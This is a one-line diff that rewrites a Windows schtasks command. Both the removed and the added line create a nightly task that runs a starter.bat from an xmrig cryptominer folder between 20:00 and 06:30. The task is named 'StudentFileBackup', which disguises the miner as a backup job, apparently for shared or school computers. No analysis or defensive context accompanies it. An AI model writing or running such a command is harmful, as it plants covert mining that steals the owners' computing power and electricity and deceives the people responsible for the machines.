@@ -1,1 +1,1 @@
-SCHTASKS /CREATE /SC DAILY /TN "\StudentFileBackup" /TR "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat" /ST 20:00 /ET 06:30 /K
+schtasks /create /sc daily /tn StudentFileBackup /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat" /st 20:00 /et 06:30 /k
